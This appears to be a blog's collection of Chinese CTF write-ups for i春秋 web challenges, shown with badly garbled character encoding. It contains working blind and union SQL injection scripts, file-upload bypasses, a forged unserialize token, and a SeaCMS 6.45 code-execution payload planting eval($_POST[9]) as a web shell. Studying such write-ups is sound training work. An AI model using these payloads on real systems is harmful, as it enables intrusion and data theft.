uploadï¼Ÿè¿™ä¸€é¢˜ä¾æ—§æ˜¯æ–‡ä»¶ä¸Šä¼ é¢˜ï¼Œå…ˆçœ‹ä¸€ä¸‹æ˜¯é»‘åå•è¿˜æ˜¯ç™½åå•è¿‡æ»¤ï¼Œä¸Šä¼ äº†ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå‘ç°è¿˜æ˜¯è¯´æ–‡ä»¶ç±»å‹ä¸å…è®¸ï¼Œæ‰€ä»¥æ¨æµ‹æ˜¯ç™½åå• ä¸Šä¼ jpgæ–‡ä»¶ï¼Œç„¶åä¿®æ”¹åç¼€ä¸ºphpå³å¯ç»•è¿‡ä¸Šä¼  ä¸Šä¼ ä»¥åçœ‹äº†ä¸€ä¼šéƒ½æ²¡å‘ç°flagï¼Œå‘ç°æ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œå¯èƒ½æ˜¯è¦æˆ‘ä»¬çœ‹æ•°æ®åº“å§ï¼Œæ‰€ä»¥åœ¨ç”¨èšå‰‘è¿æ¥æ•°æ®åº“ï¼Œå³å¯è·å¾—flagï¼Œ flag{04add780-f807-45af-aea6-99ae0d3d2e09} Uploadç¬¬ä¸€å±Šâ€œç™¾åº¦æ¯â€ä¿¡æ¯å®‰å…¨æ”»é˜²æ€»å†³èµ› çº¿ä¸Šé€‰æ‹”èµ›ä»–è®©æˆ‘ä»¬é€Ÿåº¦è¦å¿«ï¼Œç„¶åæŸ¥çœ‹åˆ°ä¿¡æ¯ï¼Œè®©æˆ‘ä»¬postæ‰¾åˆ°çš„ä¸œè¥¿ çœ‹äº†ä¸€ä¸‹å…¶ä»–åœ°æ–¹ï¼Œå‘ç°ä¹Ÿæ²¡å•¥æœ‰ç”¨çš„ä¿¡æ¯äº†ï¼Œç„¶åå°±æŠ“åŒ…ï¼Œçœ‹åˆ°å›åº”çš„æŠ¥æ–‡ä¸­æœ‰flagï¼Œä½†æ˜¯æ¯æ¬¡æ”¶åˆ°çš„éƒ½ä¸ä¸€æ ·ï¼Œå°±æƒ³åˆ°ä¹‹å‰åœ¨bugkué‡Œé¢åšè¿‡ä¸€é¢˜ç±»ä¼¼çš„ï¼Œæ‰€ä»¥å°±ç”¨äº†ä¹‹å‰ç”¨è¿‡çš„è„šæœ¬ 1234567891011121314import requestsimport base64url = 'http://3013bae61dcc4556a1e1e2574cdd037795ba5817823d4218.changame.ichunqiu.com/'r = requests.session()headers = r.get(url).headersmid = base64.b64decode(headers['flag'])print(mid)mid = mid.decode() # å› ä¸ºbase64è§£å¯†ä¸€æ¬¡æ˜¯byteç±»å‹ï¼ŒåŒ…å«äº†ä¸­æ–‡å­—ç¬¦ï¼Œæ‰€ä»¥è¿˜éœ€è¦è§£ç ä¸€æ¬¡print(mid)flag = base64.b64decode(mid.split(':')[1])print(flag)data = {'ichunqiu': flag}print(r.post(url, data).text) æœç„¶è·‘å‡ºæ¥äº† ä»–è¯´path=è¿™ä¸ªä¸œè¥¿æˆ‘ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯è¢«åŠ å¯†äº†ï¼Œä¸€ç›´å»è§£å¯†éƒ½æ²¡æ‰¾åˆ°ç»“æœï¼Œç„¶åè¿˜æ˜¯çœ‹äº†wpï¼Œå‘ç°ç›´æ¥æŠŠå®ƒåŠ åœ¨è·¯å¾„ä¸Šå°±å¯ä»¥äº†ï¼Œè¿æ¥åç™»é™†åˆ°é¡µé¢ï¼Œçœ‹åˆ°ç™»å½•æ¡†ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯SQLæ³¨å…¥ï¼Œå°è¯•äº†ä¸€ä¼šå‘ç°éƒ½æ²¡å•¥æ”¶è·ï¼Œæ²¡åŠæ³• å†å»çœ‹äº†ä¸€ä¸‹wp è¯´æ˜¯svpæºç æ³„éœ²ï¼Ÿï¼Ÿï¼Ÿè¿™æˆ‘å°±æ‡µäº†ï¼Œä¸æ‡‚åœ¨å“ªé‡Œçœ‹å‡ºæ¥çš„ï¼Œç„¶åå»ä¸‹é¢ç¿»è¯„è®ºï¼Œçœ‹åˆ°è¯´æ˜¯ç»éªŒï¼Œäºæ˜¯å»æœç´¢äº†ä¸€æ³¢ï¼Œå¤§æ¦‚æœ‰å‡ ç§æºç æ³„éœ²ï¼Œå†³å®šæ•´ç†ä¸€æ³¢ã€‚ æ¥ä¸‹æ¥æ‹¿å»MD5ç¼–ç ä¸€ä¸‹å¯å¾—åˆ°8638d5263ab0d3face193725c23ce095 è¿™é‡Œè¯´æ˜¯éœ€è¦captchaçš„MD5åŠ å¯†åçš„å‰å…­ä½æ˜¯365268ï¼Œè¿™é‡Œç¼–å†™ä¸€ä¸ªè„šæœ¬:è¿™ä¸ªæ˜¯å‚è€ƒè„šæœ¬ï¼š 12345678910import hashlibdef md5(s) return hashlib.md5(str(s).encode('utf-8')).hexdigest()def main(s): for i in range(1,999999999): if md5(i)[0:6] == str(s): print(i) exit(0)if __name__=='__mian__':#è¿™é‡Œæ˜¯ç›¸å½“äºä¸€ä¸ªå…¥å£ï¼Œå…·ä½“å¯ä»¥è°·æ­Œ mian(&quot;******&quot;) è‡ªå·±ç¼–å†™: 12345678import hashlibs='*****'for i in range(1,9999999)://å¦‚æœè·‘ä¸å‡ºæ¥ å°±æŠŠæ•°å­—èŒƒå›´å†åŠ å¤§ç‚¹ i=a i=hashlib.md5(str(i).encode('uft-8')).hexdigest() if i[0:6] == str(s): print(a) break è¿™é‡Œå¯†ç éšæ„éƒ½å¯ä»¥ çˆ†ç ´å‡ºéªŒè¯ç ä»¥åç™»å½•å³å¯çœ‹åˆ°è¿™ä¸ªæ¡† 1The 7815696ecbf1c96e6894b779456d330e.php:)Welcome 8638d5263ab0d3face193725c23ce095! æç¤ºè¯´è¿™ä¸ªMD5è§£ç åçš„asd.phpè®©æˆ‘ä»¬æ‰“å¼€çœ‹çœ‹åæ¥å‘ç° æ ¹æœ¬ä¸éœ€è¦è§£ç â€“æ„Ÿè§‰å¯¹äºè¯†åˆ«æ˜¯ä½•ç§åŠ å¯†æ–¹å¼çš„èƒ½åŠ›è¿˜ä¸ç†Ÿæ‚‰ï¼Œå…¨å‡­æ„Ÿè§‰ï¼Œè¿˜æ˜¯è¦å†å»å­¦ä¹ ä¸€ä¸‹æ¥ä¸‹æ¥å°±åˆ°äº†æ–‡ä»¶ä¸Šä¼  ä¸Šä¼ txtæ–‡ä»¶ä¹Ÿä¸å¯ä»¥ä¸Šä¼ ï¼Œä¸Šä¼ phpæ–‡ä»¶ä¸è¡Œï¼Œæ‰€ä»¥è¿™é‡Œæ¨æµ‹ä¸€ä¸‹åº”è¯¥æ˜¯ç™½åå•è¿‡æ»¤,ä½†æ˜¯åº”è¯¥è¿˜æœ‰æ£€æŸ¥å…¶ä»–å‚æ•°å§ï¼ŒburpsuitæŠ“åŒ…çš„æ—¶å€™æ”¹ä¸€ä¸‹MIMEå‚æ•°è¯•è¯•èƒ½ä¸èƒ½ç»•è¿‡é‚£å°±é¦–å…ˆæŠŠå¸¸ç”¨çš„å‡ ä¸ªåç¼€éƒ½è¯•è¯•å¥½äº†:å¤§å°å†™ã€phtã€phtmlã€php3ã€php5ï¼Œæœ€åå‘ç°phtå¯ä»¥å¾—åˆ°flag","link":"/2021/02/08/i%E6%98%A5%E7%A7%8B1/"},{"title":"iæ˜¥ç§‹2","text":"SQLæ³¨å…¥â€”â€”1åœ¨æ›´æ¢?id=3æ—¶ï¼Œå®ƒä¼šè®©ä½ å åŠ è¾“å…¥tipsï¼Œæ­¤æ—¶ä½ å°±å¯ä»¥çœ‹åˆ°ä½ è¾“å…¥çš„sqlè¯­å¥ï¼Œç®—æ˜¯ä¸€ä¸ªå¸®åŠ©å§ï¼Œç„¶åè¿™å…³æ²¡å•¥è¿‡æ»¤çš„å¥½åƒï¼Œç›´æ¥union selectè”åˆæ³¨å…¥å°±å¯ä»¥äº† SQLæ³¨å…¥â€”â€”2adminâ€™and 1=1#â€”â€”è´¦å·æˆ–å¯†ç é”™è¯¯ â€”â€”u8befadminâ€™and 1=2#â€”â€”è´¦å·ä¸å­˜åœ¨ â€”â€” u5728åˆ¤æ–­éœ€è¦ç›²æ³¨ï¼šå†™è„šæœ¬ç”±äºä¸çŸ¥é“åˆ—åï¼Œæ‰€ä»¥å°±ä¸èƒ½ç›´æ¥çˆ†ç ´å¯†ç ï¼Œå¹¸å¥½è¿‡æ»¤çš„ä¸æ˜¯å¾ˆå¤šï¼Œåæ­£substræ²¡è¢«è¿‡æ»¤ï¼Œå°±å¼€å§‹ç›²æ³¨å§ï¼Œè¿‡æ»¤äº†selectï¼Œä½†æ˜¯å¯ä»¥ç”¨åŒå†™ç»•è¿‡ 12345678910111213141516import requestsurl=&quot;http://eci-2ze42dfnzqpolzrkhy2v.cloudeci1.ichunqiu.com/login.php&quot;s=requests.session()headers = s.get(url).headerspassword = &quot;&quot;for i in range(1,33): for j in '0123456789qwertyuiopasdfghjklzxcvbnm!?._+=`~&amp;*{}[]': payload =f&quot;admin'-(substr(database(),{i},1)='{j}')-'#&quot; print(payload) data = {'name': payload,'pass': 'sky'} # print(s.post(url,data=data).text) if 'u5728' in s.post(url=url,data=data).text: #print(s.post(url,data=data).text) password += j print(password) break å¾—åˆ°æ•°æ®åº“åå­— 12345678910111213141516import requestsurl=&quot;http://eci-2ze42dfnzqpolzrkhy2v.cloudeci1.ichunqiu.com/login.php&quot;s=requests.session()headers = s.get(url).headerspassword = &quot;&quot;for i in range(1,33): for j in '0123456789qwertyuiopasdfghjklzxcvbnm!?._+=`~&amp;*{}[],ï¼Œ': payload =f&quot;admin'-(substr((selselectect table_name from information_schema.tables where table_schema='note' limit 0,1),{i},1)='{j}')-'#&quot; print(payload) data = {'name': payload,'pass': 'sky'} # print(s.post(url,data=data).text) if 'u5728' in s.post(url=url,data=data).text: #print(s.post(url,data=data).text) password += j print(password) break å•¥ï¼Ÿæ²¡å¯†ç ï¼Ÿç›´æ¥flagäº†å—ï¼Œé‚£å°±ç»§ç»­å§ 12345678910111213141516import requestsurl=&quot;http://eci-2ze42dfnzqpolzrkhy2v.cloudeci1.ichunqiu.com/login.php&quot;s=requests.session()headers = s.get(url).headerspassword = &quot;&quot;for i in range(1,33): for j in '0123456789qwertyuiopasdfghjklzxcvbnm!?._+=`~&amp;*{}[],ï¼Œ': payload =f&quot;admin'-(substr((selselectect column_name from information_schema.columns where table_name='fl4g' limit 0,1),{i},1)='{j}')-'#&quot; print(payload) data = {'name': payload,'pass': 'sky'} # print(s.post(url,data=data).text) if 'u5728' in s.post(url=url,data=data).text: #print(s.post(url,data=data).text) password += j print(password) break æ‹¿åˆ°å­—æ®µåï¼š 12345678910111213141516import requestsurl=&quot;http://eci-2ze42dfnzqpolzrkhy2v.cloudeci1.ichunqiu.com/login.php&quot;s=requests.session()headers = s.get(url).headerspassword = &quot;&quot;for i in range(1,33): for j in '0123456789qwertyuiopasdfghjklzxcvbnm!?._+=`~&amp;*{}[],ï¼Œ': payload =f&quot;admin'-(substr((seselectlect flag from fl4g limit 0,1),{i},1)='{j}')-'#&quot; print(payload) data = {'name': payload,'pass': 'sky'} # print(s.post(url,data=data).text) if 'u5728' in s.post(url=url,data=data).text: #print(s.post(url,data=data).text) password += j print(password) break æ‹¿åˆ°flag æ„Ÿè§‰æ²¡å•¥éš¾åº¦ï¼Œå”¯ä¸€å¡å£³çš„åœ°æ–¹å°±æ˜¯ä¸€ä¸ªå¼€å§‹çš„fuzzè¿‡æ»¤çœ‹åäº†ï¼Œä»¥ä¸ºselectæ˜¯æ²¡è¿‡æ»¤çš„ï¼Œå…¶ä»–å…¨è¿‡æ»¤äº†ï¼Œåæ¥å‘ç°å…¶å®ä¸æ˜¯æ»´ web-SQLIçœ‹åˆ°æç¤ºè¯´æœ‰login.phpï¼Œæ‰€ä»¥å°±æ‰“å¼€äº†ï¼Œå‘ç°å°è¯•äº†å¾ˆå¤šæ³¨å…¥å§¿åŠ¿éƒ½ä¸å¯¹ï¼Œäºæ˜¯å†å»æ‰¾çº¿ç´¢ï¼Œçœ‹äº†ä¸€ä¸‹wpå‘ç°åŸæ¥æ˜¯l0gin.php==åæ¥å»çœ‹äº†ä¸€ä¸‹ ä¸ºå•¥æ˜¯l0gin.phpï¼Œè¯´æ˜¯ç»éªŒå§ã€‚ã€‚ã€‚ã€‚å¯èƒ½ç¡®å®éœ€è¦å¤šç§¯ç´¯å§ï¼Œå°±åƒä¹‹å‰é‚£ä¸ªå¤‡ä»½æ–‡ä»¶æ³„éœ²ä¸€æ · åœ¨è¿›è¡Œsqlæ³¨å…¥çš„æ—¶å€™ï¼Œå‘ç°è¾“å…¥çš„å†…å®¹ä¼šæ˜¾ç¤ºåœ¨idä¸­ï¼Œå½“æˆ‘è¾“å…¥é€—å·çš„æ—¶å€™ï¼Œé€—å·ä»¥åçš„å†…å®¹å°±ä¸ä¼šè¢«æ˜¾ç¤ºæ­¤æ—¶æœ‰ä¸¤ç§è§£å†³æ–¹æ³•ï¼š1.å¯»æ‰¾ä»£æ›¿é€—å·çš„ç¬¦å·2.ç¼–å†™ç›²æ³¨è„šæœ¬ï¼Œå› ä¸ºå‘ç°ï¼Œå¦‚æœæ˜¯æ­£ç¡®çš„åé¢çš„usernameæ˜¯ä¼šç°å®çš„ï¼Œé€šè¿‡åé¢çš„-1-ä»¥åŠ-0-å¯ä»¥çœ‹å‡ºå…ˆå°è¯•ä¸€ä¸‹æ–¹æ³•1å§: payload: 123?id=-1'union select * from ((select group_contat(table_name) from information_schema.tables where table_schema=database())a join (select user())b) %23?id=-1'union select * from ((select group_concat(column_name) from information_schema.columns where table_name='users')a join (select user())b) %23?id=-1'union select * from ((select flag_9c861b688330 from users)a join (select user())b) %23 è¿™é‡Œä½¿ç”¨çš„æ˜¯joinä»£æ›¿é€—å·ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œjoinå†…å®¹çš„ç±»å‹éœ€è¦ä¸€æ ·ï¼Œå…¶æ¬¡åé¢éœ€è¦åŠ ä¸€ä¸ªå­—ç¬¦ï¼Œç„¶åè¿™é‡Œçš„æ³¨é‡Šç¬¦å¾ˆå¥‡æ€ªï¼Œåœ¨è¿™é‡Œå¡äº†å¾ˆä¹… ä¸èƒ½ä½¿ç”¨â€“+ ä½†æ˜¯å¯ä»¥ç”¨%23æˆ–è€… â€“ -ç›²æ³¨è„šæœ¬ 1234567891011121314151617181920import requestsurl=&quot;http://6f89d5298bc448ac8af388b5a68da444863034a569d8481a.changame.ichunqiu.com/l0gin.php?id=&quot;s=requests.session()headers = s.get(url).headerspassword = &quot;&quot;for i in range(1,33): for j in '0123456789qwertyuiopasdfghjklzxcvbnm!?._+=`~&amp;*{}[],ï¼Œ': payload =f&quot;1'-(mid((database())from(-{i}))='{j}{password}')-'&quot; print(payload) #print(s.get(url+payload).text) if 'flag' in s.get(url+payload,headers=headers).text: #print(s.post(url,data=data).text) strA = password password = strA[::-1] print(password)#å¯ä¸ç”¨ï¼Œæ˜¯ç”¨æ¥è°ƒè¯•çš„ password += j strA = password password = strA[::-1] print(password) break è¿™ä¸ªç›²æ³¨è„šæœ¬çš„è¯­å¥ä¾æ—§æ˜¯æ²¿ç”¨ä¹‹å‰çš„ï¼Œå½“æˆ‘åœ¨burp suitæµ‹è¯•çš„æ—¶å€™ï¼Œè¯­å¥æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œä½†æ˜¯å½“æˆ‘æ”¾åˆ°pycharmè·‘çš„æ—¶å€™æ°¸è¿œåªæœ‰ä¸€æ¡ä¿¡æ¯ï¼Œæ¨æµ‹æ˜¯è¢«æ‹¦æˆªäº†ã€‚æœ€åflagå°±å‡ºæ¥äº† ç»•è¿‡å‚è€ƒï¼šhttps://yang1k.github.io/post/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86%E6%80%BB%E7%BB%93/#%E7%BB%95%E8%BF%87%E5%AF%B9%E9%80%97%E5%8F%B7-%E7%9A%84%E8%BF%87%E6%BB%A4","link":"/2021/02/10/i%E6%98%A5%E7%A7%8B2/"},{"title":"iæ˜¥ç§‹3","text":"webâ€”â€”borkenè¿™é‡Œä¸€æ‰“å¼€ï¼Œå‡ºç°å¾ˆå¤š è¿™ä¸ªä¸œè¥¿ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“æ˜¯å•¥ï¼Œäºæ˜¯å°±å»çœ‹äº†ä¸€ä¸‹wpå‘ç°æ˜¯JSFUCKï¼Œæ˜¯ä¸€ç§ç¼–ç¨‹è¯­è¨€ï¼Œæ‰€ä»¥å­¦ä¹ ä¸€ä¸‹ï¼š JSFUCK:JSFuck å¯ä»¥è®©ä½ åªç”¨ 6 ä¸ªå­—ç¬¦[]()!+æ¥ç¼–å†™ JavaScript ç¨‹åºã€‚ æˆ‘çœ‹çœ‹èƒ½ä¸èƒ½è§£å¯†ï¼Œå°†é¡µé¢ä¸Šçš„JSFUCKæ‹¿å»è§£ç å‘ç°æœ€ä¸Šé¢å°‘è€Œå¦ä¸€]ï¼Œå°†å®ƒè¡¥é½ååœ¨ä¸‹é¢çª—å£è¿è¡Œï¼Œå¼¹å‡º:flag not hereçœ‹åˆ°è¿™ä¹ˆå¤šçš„å¥‡æ€ªå­—ç¬¦ï¼Œæˆ‘è§‰å¾—å¥½ç—›è‹¦ï¼Œçœ‹äº†WPæœ‰ä¸¤ç§æ–¹æ³•ï¼Œä¸€ç§æ˜¯å¯¹ç…§æ‰¾å‡ºflagåœ¨è¿™äº›ä»£ç ä¸­æ”¾ç½®çš„ä½ç½®ï¼Œç¬¬äºŒç§æ˜¯:ä¸Šé¢é‚£æ®µä»£ç çš„åŸç†å…¶å®å¾ˆç®€å•ï¼Œå®ƒä½¿ç”¨äº†Functionå…³é”®å­—å®šä¹‰ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œå¹¶ç«‹å³æ‰§è¡Œäº†ã€‚ å¦‚æœæˆ‘ä»¬åœ¨æµè§ˆå™¨æ•²å…¥ä¸‹é¢ä»£ç ï¼Œä¹Ÿä¼šå¼¹å‡ºæ•°å­—â€œ1â€ï¼š 1Function(&quot;alert(1)&quot;)() è¯¥æ®µä»£ç æœ€å()ä»£è¡¨çš„æ˜¯å‡½æ•°çš„ç»“å°¾ï¼Œæ‰€ä»¥åªè¦æŠŠæœ€åè¿™ä¸ªæ‹¬å·åˆ æ‰å°±ä¸ä¼šå¼¹æ¡†äº†ï¼Œç„¶åä¸€å¼€å§‹è¡¥é½çš„ä»£ç ï¼Œä¹Ÿéœ€è¦ä¸€èµ·åˆ é™¤ï¼Œè¿™æ ·æ‰èƒ½æ˜¾ç¤ºè¢«æ©ç›–çš„ç»“æœ web-who are youæ‰“å¼€é¡µé¢ è¯´æ²¡æœ‰æƒé™ï¼Œäºæ˜¯æŠ“åŒ…çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆä¿®æ”¹æƒé™åœ°æ–¹çœ‹èµ·æ¥åƒæ˜¯åŠ å¯†äº†ï¼Œæ‰€ä»¥base64è¯•ç€è§£ç ä¸€ä¸‹ï¼Œå¾—åˆ°f:5:&quot;thrfg&quot;;æ¥ä¸‹æ¥å°±è§¦åŠäº†çŸ¥è¯†ç›²åŒºäº†åŸæ¥ä»¥ä¸Šçš„å†…å®¹åˆä½¿ç”¨äº†rot13åŠ å¯†ï¼Œæ‰€ä»¥è§£å¯†å®Œä»¥åå˜æˆs:5:â€guestâ€ï¼Œæ›´æ”¹ä¸ºadminï¼Œå†å»é‡æ–°åŠ å¯†è¯•è¯•å¥¹ç°åœ¨è®©æˆ‘ä»¬ä¸Šä¼ ä¸œè¥¿äº†ï¼Œä½†æ˜¯å´æ²¡æœ‰ä¸Šä¼ çš„æ¡†æ¡†ï¼Œçœ‹åˆ°è¿™é‡Œæ˜¯è¦POSTä¸Šä¼ çš„ è¯•äº†å‡ ç§ä¸€å¥è¯æœ¨é©¬éƒ½è¢«è¿‡æ»¤äº†ï¼Œåæ¥å®åœ¨æƒ³ä¸åˆ°äº†ï¼Œçœ‹äº†ä¸€ä¸‹WPï¼ŒåŸæ¥--å¯ä»¥ç”¨è¾“å…¥**æ•°ç»„çš„æ–¹å¼**è¿›è¡Œç»•è¿‡æ£€æŸ¥å¤§æ¦‚ç®—æ˜¯ä¸€ç§ç»éªŒå§ï¼Œç§¯ç´¯ä¸€æ³¢ ä½†æ˜¯å½“æˆ‘æ‰“å¼€è¿™ä¸ªæ–‡ä»¶å¤¹çš„æ—¶å€™å•¥éƒ½æ²¡æœ‰â€“ï¼Œç”¨æ‰«æç›®å½•çš„å·¥å…·æ‰«äº†ä¸€æ³¢ éƒ½æ²¡å‘ç°å­˜åœ¨è¿™ä¸ªç›®å½•ï¼Œï¼Œï¼Œé˜¿è¿™æŒºæ— è¯­çš„ webâ€”â€”Loginåœ¨ä¸‹é¢å®¡æŸ¥å…ƒç´ æ‰¾åˆ°ä¸€ä¸ªç±»ä¼¼äºè´¦å·å¯†ç çš„ä¸œè¥¿ï¼Œè¾“å…¥è¿›å»ç™»å½•åå¾—åˆ°ä¸€ä¸ªå¾ˆå¥‡æ€ªçš„è¡¨æƒ…äººå‚»äº†ï¼Œä½†æ˜¯å…¶ä»–ä¿¡æ¯ä¹Ÿæ²¡æœ‰ï¼ŒburpsuitæŠ“åŒ…è¯•è¯•ï¼Œä¹Ÿæ²¡å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿=-=ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªshowçš„å‚æ•° å»çœ‹äº†ä¸€ä¸‹wpï¼Œè¿™ä¸ªshowå¥½åƒæ˜¯å…³é”®çš„ä¸œè¥¿ï¼Œç„¶åå›æ¥ï¼Œä¿®æ”¹äº†ä¸€ä¸‹showçš„å€¼ 1234567891011121314151617181920212223242526272829303132333435363738&lt;?php include 'common.php'; $requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);//ä»è¿™å‡ ä¸ªåœ°æ–¹è·å–$requsetçš„å€¼ class db //å®šä¹‰ç±» { public $where; function __wakeup()//å®šä¹‰å‡½æ•° { if(!empty($this-&gt;where)) { $this-&gt;select($this-&gt;where); } } function select($where) { $sql = mysql_query('select * from user where '.$where); return @mysql_fetch_array($sql); } } if(isset($requset['token'])) { $login = unserialize(gzuncompress(base64_decode($requset['token']))); $db = new db(); $row = $db-&gt;select('user=\\''.mysql_real_escape_string($login['user']).'\\''); if($login['user'] === 'ichunqiu') { echo $flag; }else if($row['pass'] !== $login['pass']){ echo 'unserialize injection!!'; }else{ echo &quot;(â•¯â€µâ–¡â€²)â•¯ï¸µâ”´â”€â”´ &quot;; } }else{ header('Location: index.php?error=1'); }?&gt; æŠŠshowæ”¹ä¸º1å°±å‡ºç°äº†å¦‚ä¸Šæºç ï¼šæ¥ä¸‹æ¥è¦å®¡è®¡ä¸€æ³¢è¿™ä¸ªæºç â€“å¤´å·²ç»å¼€å§‹æ™•äº†ä»”ç»†çœ‹äº†ä¸€ä¸‹ä¹Ÿæ²¡å•¥ï¼Œä¸»è¦æ˜¯è¿™ä¸ªç±»å’Œå‡½æ•°çš„å®šä¹‰ç»•æ¥ç»•å»çš„ï¼Œå…¶å®å°±æ˜¯è¦ä»åº“é‡Œselect å‡ºä¸€ä¸ªuser=ichunqiuçš„ï¼Œä½†æ˜¯è€ƒè™‘åˆ°åº“é‡Œå¯èƒ½æ²¡æœ‰è¿™ä¸ªå€¼ï¼Œæ‰€ä»¥è¿™é‡Œè¦æˆ‘ä»¬è‡ªå·±å»èµ‹å€¼ï¼Œæ‰€ä»¥æˆ‘ä»¬è½¬åŒ–çš„ä¸æ˜¯å•çº¯çš„â€˜ichunqiuâ€™è€Œæ˜¯èµ‹äºˆuserè¿™ä¸€ä¸ªé”®é”®å€¼ä¸ºichunqiu'user'-&gt;'ichunqiu' 12345&lt;?php $a = array('user'=&gt;'ichunqiu');$b = base64_encode(gzcompress(serialize($a)));echo $b?&gt; eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA==è½¬åŒ–ç»“æœï¼Œç„¶åå†cookieæ·»åŠ tokenä¸ºä»¥ä¸Šå€¼å°±è¡Œè¿™æ ·å°±å¯ä»¥å¾—åˆ°flagäº†flag{5db96a12-b37c-44e3-8152-cdd30455bae2} webâ€”â€”æµ·æ´‹cmsæ¼æ´éš”äº†å¥½å‡ å¤©äº†ï¼Œçœ‹ä¸ä¸‹å»è¿™ä¸ªæ¼æ´ï¼Œæ“ä½œä»€ä¹ˆçš„å€’æ˜¯å¾ˆå¥½æ¨¡ä»¿ï¼Œä½†æ˜¯å¯¹äºåŸç†çš„ç†è§£å°±æ¯”è¾ƒç£¨äººäº†ï¼Œä»Šå¤©å‘èª“ä¸€å®šè¦å¥½å¥½å­¦å®Œï¼ åŸç†è¿™é‡Œä¸»è¦è¯´ä¸€ä¸‹6.45çš„ä»£ç ä»»æ„æ‰§è¡Œæ¼æ´ï¼Œåœ¨è¿™ä¸ªæ¼æ´ä¸­ 12function echoSearchPage() { ...... $content = str_replace(&quot;{searchpage:page}&quot;,$page,$content); $content = str_replace(&quot;{seacms:searchword}&quot;,$searchword,$content); $content = str_replace(&quot;{seacms:searchnum}&quot;,$TotalResult,$content); $content = str_replace(&quot;{searchpage:ordername}&quot;,$order,$content); ...... $content = str_replace(&quot;{searchpage:year}&quot;,$year,$content); $content = str_replace(&quot;{searchpage:area}&quot;,$area,$content); $content = str_replace(&quot;{searchpage:letter}&quot;,$letter,$content); $content = str_replace(&quot;{searchpage:lang}&quot;,$yuyan,$content); $content = str_replace(&quot;{searchpage:jq}&quot;,$jq,$content); ...... $content = str_replace(&quot;{searchpage:state}&quot;,$state2,$content); $content = str_replace(&quot;{searchpage:money}&quot;,$money2,$content); $content = str_replace(&quot;{searchpage:ver}&quot;,$ver,$content); ...... $content=$mainClassObj-&gt;parseIf($content); str_replace()å‡½æ•°ï¼šå°†contenté‡Œé¢çš„searchpageæ¢æˆå‰é¢ä¸€ä¸ªå˜é‡ä¸­çš„ ä»£ç ä¸­å¯¹htmlä¸­çš„searchpageæ ‡ç­¾è¿›è¡Œäº†å¤šæ¬¡æ›¿æ¢ï¼Œè€Œæ”»å‡»è€…ä¹Ÿæ­£æ˜¯åˆ©ç”¨äº†è¿™ä¸€ç‚¹ï¼Œåœ¨å¤šæ¬¡æ›¿æ¢è¿‡ç¨‹ä¸­ä½¿å¤šä¸ªå‚æ•°å…±åŒç»„åˆæˆæœ€ç»ˆçš„payloadï¼Œè¿™æ ·æ—¢ç»•å¼€äº†RemoveXSSçš„è¿‡æ»¤åˆç»•è¿‡äº†20å­—èŠ‚çš„é•¿åº¦é™åˆ¶ã€‚ï¼Œåœ¨ç»è¿‡å¤šæ¬¡çš„æ›¿æ¢åï¼Œæ­¤æ—¶çš„contentå·²ç»å˜æˆäº†åŒ…å«äº†æˆ‘ä»¬åŸæœ¬çš„æ¶æ„è¯­å¥ä¾‹å­: 1searchtype=5&amp;searchword={if{searchpage:year}&amp;year=:e{searchpage:area}}&amp;area=v{searchpage:letter}&amp;letter=al{searchpage:lang}&amp;yuyan=(join{searchpage:jq}&amp;jq=($_P{searchpage:ver}&amp;&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo(); å½“æˆ‘ä»¬åœ¨urlä¸­è¾“å…¥ä»¥ä¸Šå†…å®¹ï¼Œç»è¿‡å¤šæ¬¡çš„æ›¿æ¢åï¼Œæœ€ç»ˆçš„contentå·²ç»å˜æˆä¸€ä¸‹å†…å®¹: 1if:eval(join($_POST[9])) è€Œåœ¨parselfå‡½æ•°ä¸­ï¼Œå¦‚æœåˆ¤æ–­å‡ºå«æœ‰if:æ ‡ç­¾ï¼Œåˆ™ä¼šä½¿ç”¨evalå‡½æ•°æ¥æ‰§è¡Œ 123456function parseIf($content){ if (strpos($content,'{if:')=== false){ return $content; }else{ ...... @eval(&quot;if(&quot;.$strIf.&quot;){\\$ifFlag=true;}else{\\$ifFlag=false;}&quot;); çŸ¥é“è¿™äº›åŸç†ååœ¨URLå½“ä¸­æ„å»º: 1http://ef7204bb29d84b7b82022457450f9e2b21aaa4cb0d4d4570.changame.ichunqiu.com/search.php?searchtype=5&amp;tid=&amp;letter=eval($_POST[9]) æ­¤æ—¶å°±å¯ä»¥ç”¨èšå‰‘è¿æ¥è¯¥é“¾æ¥ï¼Œå¯†ç æ˜¯9ä¸ºä»€ä¹ˆèšå‰‘å¯ä»¥ç›´æ¥è¿æ¥äº†å‘¢ï¼Ÿç»è¿‡å¤šæ¬¡æ›¿æ¢åï¼Œåœ¨æœ€åçš„ifè¯­å¥ä¸­ ä¼šæ‰§è¡Œeval($_POST[9])æ­¤å‘½ä»¤ï¼Œå°±ç›¸å½“äºæˆ‘ä»¬é€šè¿‡URLåœ¨ä¸€ä¸ªphpæ–‡ä»¶ä¸­æ’å…¥äº†ä¸€å¥è¯æœ¨é©¬ï¼Œæ‰“å¼€æ­¤URLå°±ç›¸å½“äºæ‰§è¡Œäº†è¯¥æœ¨é©¬ã€‚æ‰¾äº†ä¸€ä¸‹ï¼Œ æ‰¾åˆ°äº†é‚£ä¸ªsearch.phpï¼Œå†³å®šç­‰ä¼šè¿˜å¥½å¥½å®¡è®¡ä¸€æ³¢ï¼Œç„¶åå†çœ‹äº†ä¸€ä¸‹ï¼Œè¯´æ˜¯flagåœ¨æ•°æ®åº“ä¸­ï¼Œäºæ˜¯æ‰¾åˆ°æ•°æ®åº“çš„é…ç½®æ–‡ä»¶ï¼Œè¿æ¥åæŸ¥æ‰¾å³å¯æ‰¾åˆ°flag 